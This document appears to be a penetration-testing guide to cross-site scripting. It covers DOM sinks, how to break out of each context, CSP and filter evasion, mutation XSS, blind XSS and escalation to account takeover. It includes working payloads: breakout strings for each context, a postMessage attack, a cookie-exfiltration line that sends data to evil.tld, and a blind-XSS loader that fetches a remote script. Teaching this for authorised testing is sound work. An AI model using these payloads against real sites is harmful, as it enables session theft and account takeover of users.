# Cross-Site Scripting

Reflecting `<script>alert(1)</script>` into a page with no encoding is a 2010 bug. Today the findings are in DOM sinks, framework-specific bypasses, mutation XSS, filter and CSP evasion, and turning "self-XSS" into something that fires on a victim. The payload matters less than understanding the sink and the context.

## The mental model

XSS is your input reaching a place the browser interprets as code, in the victim's origin. Three families: reflected (input in the immediate response), stored (input persisted and served to others), and DOM-based (client-side JS writes your input into a dangerous sink). The exploit depends entirely on the context your input lands in: HTML body, attribute, JS string, URL, CSS, or a framework template. The same input is harmless in one context and executes in another.

## Where it hides / tell-tales

- **DOM sinks are where modern XSS lives**: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location`/`location.href`, `$.html()`, `insertAdjacentHTML`, `dangerouslySetInnerHTML`, template compilation, and `postMessage` handlers that write to the DOM. Trace user-controllable sources (`location.hash`, `location.search`, `document.referrer`, `postMessage` data, `localStorage`, URL fragments, `name`) to these sinks.
- **Context tells you the breakout**: inside an attribute you need to close the quote and tag; inside a `<script>` JS string you need to break the string and statement; inside a URL you try `javascript:`; inside a template you try the engine's syntax (which may be client-side template injection, a cousin of XSS).
- **Reflected-but-encoded in one context, raw in another**: a value encoded in the HTML body may be raw in a JSON response consumed by `innerHTML`, or raw in an attribute. Test every reflection point, not just the first.
- **Framework escape hatches**: React `dangerouslySetInnerHTML`, Angular `bypassSecurityTrust*`, Vue `v-html`, and server templates with `|safe`/`raw`/`noescape`. These re-open XSS that the framework normally prevents.
- **"Self-XSS" that is not**: an input only you can set in your own account looks low until paired with a way to set it on a victim (CSRF, an IDOR that writes to their profile, a shared document, an admin who views your data).

## Real material

Context-specific breakouts:

```html
<!-- HTML body context -->
"><img src=x onerror=alert(document.domain)>
<!-- attribute context (inside value="...") -->
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
<!-- inside a JS string: </script> often works, or break the string -->
</script><script>alert(1)</script>
';alert(1);//
<!-- URL / href context -->
javascript:alert(document.domain)
<!-- inside an existing event handler or template -->
';alert(1);//
```

DOM XSS via hash into `innerHTML` (no server involvement, invisible to server-side WAFs):

```
https://app.target.com/page#<img src=x onerror=alert(document.domain)>
// when JS does: el.innerHTML = decodeURIComponent(location.hash.slice(1))
```

postMessage XSS (a handler that trusts any origin and writes to the DOM):

```js
// vulnerable listener:
window.addEventListener('message', e => { document.getElementById('out').innerHTML = e.data; });
// attacker page:
victim.postMessage('<img src=x onerror=alert(origin)>', '*');
```

A stealable-session payload (exfiltrate non-HttpOnly cookie or act as the user):

```html
<img src=x onerror="fetch('https://evil.tld/c?d='+encodeURIComponent(document.cookie))">
<!-- better: perform an in-session action (change email, create API key) via fetch,
     which works even with HttpOnly cookies because the browser attaches them -->
```

## Beyond the basics

- **Source-to-sink DOM analysis**: do not fuzz blindly; read the JS. Find sources, follow them to sinks, and craft the payload for the exact sink. Browser DevTools, `DOM Invader`, and setting breakpoints on `innerHTML` setters find these fast.
- **Mutation XSS (mXSS)**: the browser's HTML parser rewrites your "safe" markup into something executable after a sanitizer ran. Classic with `innerHTML` round-trips and sanitizers like older DOMPurify versions; payloads using `<noscript>`, `<template>`, `<math>`/`<svg>` namespace confusion, and attribute reparsing. mXSS defeats sanitizers that validate pre-mutation.
- **CSP bypass**: a strict CSP blocks inline scripts, so you look for: a whitelisted CDN hosting a usable script (Angular, JSONP endpoints), `strict-dynamic` with an injectable script gadget, a nonce you can steal or that is reused, `unsafe-eval` with a template framework, base-tag injection, or dangling-markup exfiltration when script execution is blocked but data theft is not. Read the policy; the weakest directive is the path.
- **Script gadgets**: even with sanitization and CSP, HTML that a client-side framework later interprets (Angular/Vue/htmx/Alpine attributes, `data-*` bindings) can execute. Injecting `ng-app`/`v-html`/`hx-*` into sanitized HTML revives XSS.
- **Blind XSS**: stored input that fires in a context you never see (admin panel, support agent view, log viewer, PDF/email renderer). Plant a callback payload (`<script src=https://evil.tld/x.js>` or an out-of-band tool) in every stored field and wait for the hit from an internal origin. These are often the highest-impact XSS because they fire in privileged contexts.
- **Filter evasion toolkit**: case variation, unneeded tags (`<svg>`, `<math>`, `<details open ontoggle>`, `<marquee>`), event handlers beyond `onerror`/`onload` (`onanimationstart`, `onpointerover`), encoding (HTML entities, URL, unicode), broken-but-parsed markup, and null bytes. Tailor to what the filter strips.
- **From XSS to account takeover**: do not stop at `alert(1)`. Use the XSS to call privileged in-session endpoints (add an email, create an API key, disable MFA, read a reset token). That is the report-worthy impact, especially under HttpOnly where cookie theft fails but same-origin requests succeed.

## What to watch for

- `alert(1)` firing in your own DevTools console is not XSS; it must execute as part of the page in the victim's origin.
- A reflection that is HTML-encoded is not exploitable in that context; check whether it is raw in a different context before moving on.
- Auto-escaping frameworks neutralize most injection; focus on the escape hatches and DOM sinks rather than server reflections.
- Exfiltrating real users' data is out of bounds; prove execution and the privileged-action primitive against your own account.

## Hunting checklist

- Enumerate every reflection and every DOM source-to-sink path; identify the context of each.
- Craft context-specific breakouts rather than one generic payload.
- Read client JS for `innerHTML`/`eval`/`postMessage` sinks and trace sources.
- Test mutation XSS and the specific sanitizer/version in use.
- Read the CSP; find the weakest directive and a matching bypass.
- Plant blind-XSS callbacks in all stored fields.
- Escalate any confirmed XSS to a privileged in-session action.
